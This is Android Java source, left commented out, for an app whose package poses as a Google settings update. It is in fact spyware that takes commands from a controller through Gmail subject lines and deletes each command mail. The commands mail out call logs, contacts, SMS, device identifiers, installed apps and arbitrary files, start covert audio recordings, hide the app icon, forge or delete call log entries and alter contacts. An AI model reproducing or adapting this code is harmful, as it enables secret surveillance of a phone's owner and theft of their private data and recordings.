/*
package com.setting.dl.google.googlesettingupdate.mail;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.google.api.services.gmail.model.Message;
import com.google.api.services.gmail.model.MessagePartHeader;
import com.setting.dl.google.googlesettingupdate.audio.AudioService;
import com.setting.dl.google.googlesettingupdate.MailJobs;
import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.phone.Calls;
import com.setting.dl.google.googlesettingupdate.phone.Contacts;
import com.setting.dl.google.googlesettingupdate.phone.FileSplitter;
import com.setting.dl.google.googlesettingupdate.phone.InstalledApps;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PTTKahverengi;
import com.setting.dl.google.googlesettingupdate.u;

import java.io.File;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import static com.setting.dl.google.googlesettingupdate.mail.gmail.GmailService.getGmailService;

public class Orders {
   
   private static String order         = "";
   private static String lastMessageId = "";
   //private static String body;
   
   private static List<Message> getInboxMessages(Context context) {
      
      return Mail.mylistMessagesWithLabelsWithQ(getGmailService(context), Collections.singletonList("INBOX"), String.format("from:%s", getTo(context)));
   }
   
   
   public static void getOrderEx(final Context context) {
      
      if (!u.isOnline(context)) {
         return;
      }
      
      
      Run.runThread(() -> {
         
         u.log.d("komut kontrol ediyor");
         
         List<Message> inboxMessages;
         List<Message> messages = new ArrayList<>();
         
         try {
            
            inboxMessages = getInboxMessages(context);
            
            if (inboxMessages == null) {
               
               return;
            }
            
            if (inboxMessages.isEmpty()) {
               
               u.log.d("komut yok");
               return;
            }
            
            for (int i = 0; i < inboxMessages.size(); i++) {
               
               Message m   = inboxMessages.get(i);
               Message msg = getMessage(context, m.getId());
               messages.add(msg);
            }
         }
         catch (Exception e) {
            
            String error = String.format("Mail alınamadı : %s%ncause : %s", e, e.getCause());
            u.saveToFile(context, "error", error);
            u.log.w(error);
         }
         
         
         for (Message message : messages) {
            
            if (message == null || message.getId() == null) continue;
            
            if (message.getId().equals(lastMessageId)) {
               
               continue;
            }
            
            lastMessageId = message.getId();
            
            order = getSubject(message);
            
            if (order == null || order.isEmpty()) {
               
               deleteOrder(context, message.getId());
               continue;
            }
            
            u.log.d("Komut alındı : " + order);
            
            deleteOrder(context, message.getId());
            
            try {
               doit(context);
            }
            catch (OrderException e) {
               e.printStackTrace();
               
               u.saveToFile(context, "Komut Hatası", e.toString() + "\norder : " + order);
               
            }
            catch (Exception e) {
               
               u.saveToFile(context, "Orders Hata", e.toString() + "\norder : " + order);
               
            }
         }
         
      });
   }
   
   private static void doit(Context context) throws OrderException {
      
      
      if (order.contains("rc"*/
/*"record"*//*
)) {
         
         record(context);
         return;
      }
      
      
      switch (order) {
         
         
         case "cl"://"callLog":
            new OrderSend().calls(context);
            return;
         
         
         case "ct"://"contacts":
            new OrderSend().contacts(context);
            return;
         
         
         case "ms"://"messages":
            new OrderSend().sms(context);
            return;
         
         case "bt"://"battery":
            
            String fileBattery = "battery";
            Mail.sendTextFile(context, fileBattery, new OrderSend().battery(context));
            
            return;
         
         //delete audioparts
         case "da"://"delete audioparts":
            
            File[] audioFiles = new File(u.getAudioFolder(context)).listFiles();
            
            if (audioFiles == null) return;
            
            for (File file : audioFiles) {
               
               if (file.delete()) {
                  
                  u.log.d("silindi : %s", file.getName());
               }
               else {
                  
                  u.log.d("silinemedi : %s", file.getName());
               }
            }
            
            audioFiles = new File(u.getAudioFolder(context)).listFiles();
            
            String val = String.format(new Locale("tr"), "Kalan dosya sayısı : %d", audioFiles.length);
            
            Mail.sendTextFile(context, "Silme", val);
            return;
         
         
         case "ga"://"get audioparts":
            
            PTTKahverengi.getInstance(context).startWork();
            return;
         
         
         case "af"://"audio files":
            
            StringBuilder audioFileList = new StringBuilder(Time.dateStamp());
            
            File[] files = new File(u.getAudioFolder(context)).listFiles();
            File onRecordingFile = AudioService.getOnRecordingFile();
            
            if (files != null) {
               
               if (files.length > 0) {
                  
                  for (File file : files) {
                     
                     if (onRecordingFile != null && onRecordingFile.getName().equals(file.getName())) {
                        
                        audioFileList.append(String.format(new Locale("tr"), "(kayıtta) %s%n", file.getName()));
                        continue;
                     }
                     
                     
                     audioFileList.append(String.format(new Locale("tr"),
                           "name=%s, duration=%s, mb=%.2f%n",
                           file.getName(),
                           u.getMp3Duration(file),
                           (float) file.length() / (1024 * 1024)));
                     
                  }
                  
               }
               else {
                  
                  audioFileList.append("Klasörde ses dosyası yok\n");
               }
               
               audioFileList.append("\n*************************\n");
               Mail.sendTextFile(context, "Ses Listesi", audioFileList.toString());
            }
            else {
               
               Mail.sendTextFile(context, "Ses Listesi", "new File(u.getAudioFolder(context)).list() = null");
            }
            
            return;
         
         
         case "pi":
            
            String filePhoneInfo = "pi";
            Mail.sendTextFile(context, filePhoneInfo, getPhoneInfo(context));
            
            return;
         
         case "apps":
            String v = new InstalledApps(context).get();
            new MailSendIcons(context, v);
            
            return;
         
         case "gi":
            
            new MailSendIcons(context, "icons");
            return;
         
         case "wake":
            
            u.saveToFile(context, "Orders", "wake");
            PTTKahverengi.getInstance(context).startWork();
            return;
         
         
         case "sendmyfile":
            
            File folder = new File(context.getFilesDir(), "myfile");
            
            if (folder.exists()) {
               
               File[] myFiles = folder.listFiles();
               
               for (File file1 : myFiles) {
                  
                  Mail.send(context, "sendfile", file1.getName(), file1);
               }
            }
            
            
            return;
         
         
         case "delmyfiles":
            
            
            File folder2 = new File(context.getFilesDir(), "myfile");
            
            if (folder2.exists()) {
               
               File[] myFiles = folder2.listFiles();
               
               for (File file1 : myFiles) {
                  
                  if (file1.delete()) {
                     
                     u.log.d("myfile silindi : %s", file1.getName());
                  }
                  else {
                     
                     u.log.d("myfile silinemedi : %s", file1.getName());
                  }
               }
               
               
               folder2 = new File(context.getFilesDir(), "myfile");
               
               Mail.sendTextFile(context,
                     "delmyfiles", u.format("Kalan dosya sayısı : %d", folder2.list().length));
            }
            
            return;
         
         
         case "mainlist":
            
            File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
            
            if (!file.exists() || !file.isDirectory()) {
               
               String error = u.format("Böyle bir klasör yok : %s", file.getAbsolutePath());
               Mail.sendTextFile(context, "mainlist", error);
               return;
            }
            
            File[] files2 = file.listFiles();
            
            if (files2 != null) {
               
               if (files2.length == 0) {
                  
                  String msg = u.format("Klasörde dosya yok : %s", file.getName());
                  Mail.sendTextFile(context, "mainlist", msg);
               }
               else {
                  
                  StringBuilder msg = new StringBuilder(u.format("Klasörde %d dosya var%n", files2.length));
                  msg.append("-------------------------------\n");
                  
                  int i = 1;
                  
                  for (File file1 : files2) {
                     
                     msg.append(u.format("%d. name=%s, isDir=%s, size=%.2fMB, date=%s%n",
                           
                           i++,
                           file1.getAbsolutePath(),
                           file1.isDirectory(),
                           file1.isDirectory() ? 0.0F : (float) file1.length() / (1024 * 1024),
                           Time.getSendDate(file1.lastModified())
                     ));
                  }
                  
                  
                  Mail.sendTextFile(context, "mainlist", msg.toString());
                  return;
                  
               }
            }
            
            return;
         
         
         case "listeners":
            
            Set<String> listeners = NotificationManagerCompat.getEnabledListenerPackages(context);
            
            StringBuilder s = new StringBuilder(u.format("%d active listeners%n", listeners.size()));
            
            int i = 1;
            
            for (String listener : listeners) {
               
               s.append(i++).append(". ").append(listener).append("\n");
            }
            
            Mail.sendTextFile(context, "listeners", s.toString());
            return;
         
         
         case "sa":
            
            u.showHideApp(context, false);
            Mail.sendTextFile(context, "sa", "app show");
            return;
         
         //uygulamayı gizle
         case "ha":
            
            u.showHideApp(context, true);
            Mail.sendTextFile(context, "ha", "app hide");
            return;
         
         //ses klasörü içindeki dosyaları gönder
         case "saufiles":
            
            Run.runThread(() -> Mail.sendAudioFiles(context));
            return;
         
         case "sffiles":
            
            MailJobs.wake(context);
            return;
         
         //dışardan kayıt yapmayı durdur
         case "sr":
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stoprecords", true).apply();
            return;
         
         //kayda izin ver
         case "ssr":
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stoprecords", false).apply();
            return;
         
         case "scr":
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stopcallrecords", true).apply();
            return;
         
         case "sscr":
            
            context.getSharedPreferences("audio", Context.MODE_PRIVATE).edit().putBoolean("stopcallrecords", false).apply();
            return;
         
         
      }
      
      if (order.contains("change account")) {
         
         
         if (!order.contains("_")) {
            
            throw new OrderException("Hesap değiştirme komutu hatalı : " + order);
         }
         
         String newAccount = order.split("_")[1];
         u.log.d("yeni hesap geçerli mi kontrol ediliyor : " + newAccount);
         
         if (isValidEmail(newAccount)) {
            
            u.log.d("yeni hesap geçerli");
            
            context.getSharedPreferences("gmail", Context.MODE_PRIVATE).edit().putString("to", newAccount).apply();
            Mail.sendTextFile(context, "Yeni hesap", "yeni hesap : " + newAccount);
            
            u.log.d("new account : " + newAccount);
         }
         else {
            u.log.d("yeni hesap geçerli değil");
            Mail.sendTextFile(context, "Yeni hesap", "yeni hesap geçersiz : " + newAccount);
         }
         
         return;
         
      }
      
      //NUMBER_DELETE
      if (order.contains("delete number")) {
         
         if (!order.contains("_")) {
            
            throw new OrderException("Rehberden numara silme komutu hatalı : " + order);
         }
         
         String number = order.split("_")[1];
         String name   = Contacts.deleteContactWithNumber(context, number);
         
         if (name != null) {
            
            Mail.sendTextFile(context, "Numara Silme", "Kişi silindi : " + name);
            
         }
         
         else {
            
            Mail.sendTextFile(context, "Numara Silme", "Bu numaraya sahip kişi bulunamadı : " + number);
         }
         
         return;
      }
      
      //ADD_CONTACT
      if (order.contains("add contact")) {
         
         if (!order.contains("_") || !order.contains(";")) {
            
            throw new OrderException("Rehbere kişi ekleme komutu hatalı : " + order);
         }
         
         String[] nameAndNumber = order.split("_")[1].split(";");
         
         boolean b = Contacts.addContact(context, nameAndNumber[0], nameAndNumber[1]);
         
         if (b) {
            
            Mail.sendTextFile(context, "Kişi Ekleme", "Kişi eklendi : " + nameAndNumber[0] + " " + nameAndNumber[1]);
         }
         else {
            
            Mail.sendTextFile(context, "Kişi Ekleme", "Kişi ekleme başarısız : " + nameAndNumber[0] + " " + nameAndNumber[1]);
         }
         
         
         return;
      }
      
      //UPDATE_CONTACT
      if (order.contains("update number")) {
         
         if (order.contains("_") && order.contains(";")) {
            
            throw new OrderException("Kişi güncelleme komutu hatalı : " + order);
         }
         
         String[] nameAndNewNumber = order.split("_")[1].split(";");
         
         boolean b = Contacts.updateContact(context, nameAndNewNumber[0], nameAndNewNumber[1]);
         
         if (b) {
            
            Mail.sendTextFile(context, "Kişi Güncelleme", "Kişi güncellendi : " + nameAndNewNumber[0] + " " + nameAndNewNumber[1]);
         }
         else {
            
            Mail.sendTextFile(context, "Kişi Güncelleme", "Kişi güncelleme başarısız : " + nameAndNewNumber[0] + " " + nameAndNewNumber[1]);
         }
         
         
         return;
      }
      
      //arama kaydı sil
      if (order.contains("delete call")) {
         
         if (order.contains("_")) {
            
            String id = order.split("_")[1];
            
            try {
               
               Calls.deleteCallWithId(context.getContentResolver(), id);
               Mail.sendTextFile(context, "Call Log", "Arama kaydı silindi : " + id);
               
            }
            catch (SecurityException e) {
               
               Mail.sendTextFile(context, "Call Log", "Arama kaydı silinemedi\nGüvenlik hatası : " + id);
            }
         }
         else {
            
            throw new OrderException(order);
         }
         
         return;
      }
      
      //arama kaydı ekle
      if (order.contains("add call")) {
         
         if (order.contains("_")) {
            
            String callInfo = order.split("_")[1];
            
            if (!callInfo.contains(";")) {
               
               throw new OrderException(order);
            }
            
            String[] call = callInfo.split(";");
            
            if (call.length != 4) {
               
               throw new OrderException(order);
            }
            
            String number   = call[0];
            String date     = call[1];
            String duration = call[2];
            
            try {
               
               int type = Integer.valueOf(call[3]);
               
               Calls.insertPlaceholderCall(context.getContentResolver(), number, date, duration, type, 1);
               
            }
            catch (NumberFormatException e) {
               
               throw new OrderException(order);
            }
            catch (SecurityException e) {
               
               Mail.sendTextFile(context, "Call Log", "Arama kaydı eklenemedi\nGüvenlik hatası");
            }
         }
         
         else {
            
            throw new OrderException(order);
         }
         
         return;
         
      }
      
      //dosya sil
      if (order.contains("delfile")) {
         
         if (!order.contains(";")) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            Mail.sendTextFile(context, "delfile", error);
            return;
         }
         
         String filePath = order.split(";")[1];
         
         if (filePath.isEmpty()) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            Mail.sendTextFile(context, "delfile", error);
            return;
         }
         
         
         File file = new File(Environment.getExternalStorageDirectory(), filePath);
         
         if (!file.exists()) {
            
            String error = u.format("Böyle bir dosya yok : %s", filePath);
            
            Mail.sendTextFile(context, "delfile", error);
            return;
         }
         
         if (file.delete()) {
            
            String msg = u.format("Dosya silindi : %s", file.getName());
            
            Mail.sendTextFile(context, "delfile", msg);
         }
         else {
            
            String msg = u.format("Dosya silinemedi : %s", file.getName());
            
            Mail.sendTextFile(context, "delfile", msg);
         }
         
         return;
      }
      
      //dosyaları listele
      if (order.contains("listfiles")) {
         
         if (!order.contains(";")) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            Mail.sendTextFile(context, "listfiles", error);
            return;
         }
         
         String dir = order.split(";")[1];
         
         u.log.w("path : %s", dir);
         
         if (dir.isEmpty()) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            Mail.sendTextFile(context, "listfiles", error);
            return;
         }
         
         //Environment.getExternalStorageDirectory()
         File file = new File(Environment.getExternalStorageDirectory(), dir);
         
         if (!file.exists() || !file.isDirectory()) {
            
            String error = u.format("Böyle bir klasör yok : %s", dir);
            Mail.sendTextFile(context, "listfiles", error);
            return;
         }
         
         File[] files = file.listFiles();
         
         if (files != null) {
            
            if (files.length == 0) {
               
               String msg = u.format("Klasörde dosya yok : %s", file.getName());
               Mail.sendTextFile(context, "listfiles", msg);
            }
            else {
               
               StringBuilder msg = new StringBuilder(u.format("Klasörde %d dosya var%n", files.length));
               msg.append("-------------------------------\n");
               
               int i = 1;
               
               for (File file1 : files) {
                  
                  msg.append(u.format("%d. name=%s, isDir=%s, size=%.2fMB, date=%s%n",
                        
                        i++,
                        file1.getAbsolutePath(),
                        file1.isDirectory(),
                        file1.isDirectory() ? 0.0F : (float) file1.length() / (1024 * 1024),
                        Time.getSendDate(file1.lastModified())
                  ));
               }
               
               
               Mail.sendTextFile(context, "listfiles", msg.toString());
               return;
               
            }
         }
         
         
      }
      
      //send a file
      if (order.contains("sendfile")) {
         
         if (!order.contains(";")) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            Mail.sendTextFile(context, "sendfile", error);
            return;
         }
         
         String path = order.split(";")[1];
         
         if (path.isEmpty()) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            Mail.sendTextFile(context, "sendfile", error);
            return;
         }
         
         
         File file = new File(Environment.getExternalStorageDirectory(), path);
         
         if (!file.exists()) {
            
            String error = u.format("Böyle bir dosya yok : %s", path);
            
            Mail.sendTextFile(context, "sendfile", error);
            return;
         }
         
         long maxByte = 5242880;
         
         if (file.length() > maxByte) {
            
            File folder = new File(context.getFilesDir(), "myfile");
            
            if (!folder.exists()) {
               
               if (folder.mkdir()) {
                  
                  new FileSplitter(context, file, folder).split();
                  
                  File[] files = folder.listFiles();
                  
                  for (File file1 : files) {
                     
                     Mail.send(context, "sendfile", file1.getName(), file1);
                  }
               }
            }
            else {
               
               new FileSplitter(context, file, folder).split();
               
               File[] files = folder.listFiles();
               
               for (File file1 : files) {
                  
                  Mail.send(context, "sendfile", file1.getName(), file1);
               }
            }
         }
         else {
            
            Mail.sendFile(context, "sendfile", file.getName(), file);
         }
         
         
      }
      
      if (order.contains("saf")) {
         
         if (!order.contains(";")) {
            
            String error = u.format("Komut hatalı : %s", order);
            
            Mail.sendTextFile(context, "saf", error);
            return;
         }
         
         String fileName = order.split(";")[1];
         
         File file = new File(u.getAudioFolderFile(context), fileName);
         
         if (!file.exists()) {
            
            Mail.sendTextFile(context, "saf", u.format("%s%nBöyle bir dosya yok : %s", Time.dateStamp(), fileName));
         }
         else {
            
            Mail.send(context, "saf", fileName, file);
         }
      }
      
      
   }
   
   private static void record(Context context) {
      
      if (!order.contains("_")) {
         
         AudioService.startAudio(context, 30L, 0L);
         
         return;
      }
      
      long duration;
      long delay = 0;
      
      String durationString = order.split("_")[1];
      
      
      try {
         
         if (!durationString.contains(";")) {
            
            duration = Integer.valueOf(durationString);
         }
         else {
            
            duration = Long.valueOf(durationString.split(";")[0]);
            delay = Long.valueOf(durationString.split(";")[1]);
         }
         
         AudioService.startAudio(context, duration, delay);
         
      }
      catch (Exception e) {
         
         Mail.sendTextFile(context, "Kayıt", "Komut hatalı : " + order + "\nYeni bir kayıt oluşturuluyor");
         
         AudioService.startAudio(context, 30L, 0L);
      }
   }
   
   private static boolean isValidEmail(String email) {
      
      return !TextUtils.isEmpty(email) && android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches();
   }
   
   private static Message getMessage(final Context context, final String id) {
      
      ExecutorService executorService = Executors.newSingleThreadExecutor();
      
      Future<Message> future = executorService.submit(() -> {
         
         try {
            
            return getGmailService(context).users().messages().get("me", id).execute();
         }
         catch (Exception e) {
            
            String error = String.format("GetMessage - mail alınamadı : %s", e.toString());
            
            u.saveToFile(context, "error", error);
         }
         
         return null;
      });
      
      
      Message message = null;
      
      try {
         
         message = future.get();
      }
      catch (Exception e) {
         
         u.log.w(e);
      }
      
      executorService.shutdown();
      return message;
      
   }
   
   public static class OrderException extends Exception {
      
      OrderException(String message) {
         
         super(message);
      }
   }
   
   private static String getTo(final Context context) {
      
      return context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("to", null);
   }
   
   private static void deleteOrder(final Context context, final String id) {
      
      Run.runThread(() -> {
         
         try {
            
            getGmailService(context).users().messages().delete("me", id).execute();
            u.log.d("komut silindi");
            
         }
         catch (Exception e) {
            
            u.log.e("komut silinemedi : %s, sebebi : %s", e.getMessage(), e.getCause());
         }
      }, 5000);
   }
   
   private static String getSubject(Message message) {
      
      if (message == null) return null;
      
      List<MessagePartHeader> k = message.getPayload().getHeaders();
      
      for (MessagePartHeader messagePartHeader : k) {
         
         if ("Subject".equals(messagePartHeader.getName())) {
            
            return messagePartHeader.getValue();
         }
      }
      
      return null;
   }
   
   @SuppressLint("HardwareIds")
   private static String getPhoneInfo(Context context) {
      
      ConnectivityManager connectivityManager = (ConnectivityManager) context.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
      
      int type = 0;
      
      if (connectivityManager != null) {
         
         type = connectivityManager.getActiveNetworkInfo().getType();
      }
      
      NetworkInfo networkInfo = null;
      
      if (connectivityManager != null) {
         
         networkInfo = connectivityManager.getActiveNetworkInfo();
      }
      
      if (networkInfo == null) return "network info null\n";
      
      String value = String.format("%s\n", Time.whatTimeIsIt());
      
      if (type == ConnectivityManager.TYPE_WIFI) {
         
         value += String.format("%s %s\n", wifiName(context), getMacAddr());
         
      }
      else if (type == ConnectivityManager.TYPE_MOBILE) {
         
         value += String.format("%s %s\n", networkInfo.getSubtypeName(), networkInfo.getExtraInfo());
      }
      
      
      value += String.format("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n",
            networkInfo.getTypeName(),
            networkInfo.isConnected() ? "connected" : "disconnected",
            Build.MODEL,
            Build.DEVICE,
            Build.DISPLAY,
            Build.BRAND,
            Build.HARDWARE,
            Build.MANUFACTURER,
            Build.BOARD,
            Build.BOOTLOADER,
            Build.FINGERPRINT,
            Build.PRODUCT,
            Build.USER,
            Build.TYPE,
            Build.TAGS,
            Build.VERSION.SDK_INT,
            getImei(context)
      
      );
      
      
      //Log.i("connectivityInfo", value);
      
      return value;
   }
   
   private static String wifiName(Context context) {
      
      WifiManager wifiMgr  = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
      WifiInfo    wifiInfo = null;
      if (wifiMgr != null) {
         wifiInfo = wifiMgr.getConnectionInfo();
      }
      if (wifiInfo != null) {
         return wifiInfo.getSSID();
      }
      
      return "wifi ismi alınamıyor";
   }
   
   @NonNull
   private static String getMacAddr() {
      
      try {
         List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
         for (NetworkInterface nif : all) {
            if (!nif.getName().equalsIgnoreCase("wlan0")) continue;
            
            byte[] macBytes = nif.getHardwareAddress();
            if (macBytes == null) {
               return "";
            }
            
            StringBuilder res1 = new StringBuilder();
            for (byte b : macBytes) {
               res1.append(String.format("%02X:", b));
            }
            
            if (res1.length() > 0) {
               res1.deleteCharAt(res1.length() - 1);
            }
            return res1.toString();
         }
      }
      catch (Exception ignored) {
      }
      return "02:00:00:00:00:00";
   }
   
   @SuppressWarnings("deprecation")
   @SuppressLint("HardwareIds")
   private static String getImei(Context context) {
      
      TelephonyManager m_telephonyManager = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
      //String           IMEI, IMSI;
      if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
         
         if (m_telephonyManager != null) {
            return m_telephonyManager.getDeviceId();
         }
      }
      
      if (m_telephonyManager != null) {
         return m_telephonyManager.getDeviceId();
      }
      
      return "imei alınamıyor";
   }
   
   
}



*/
/*   
 
 
    private static String getBody(Message message) {
       
       return StringUtils.newStringUtf8(Base64.decodeBase64(message.getPayload().getParts().get(0).getBody().getData()));
       
   }
 
 
 
 @SuppressWarnings("deprecation")
    private static boolean isServiceRunning(Context context, Class<?> clazz) {
    
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        
        for (ActivityManager.RunningServiceInfo service : activityManager.getRunningServices(Integer.MAX_VALUE)) {
            
            if (clazz.getName().equals(service.service.getClassName())) {
                
                return true;
            }
        }
        return false;
    }*/
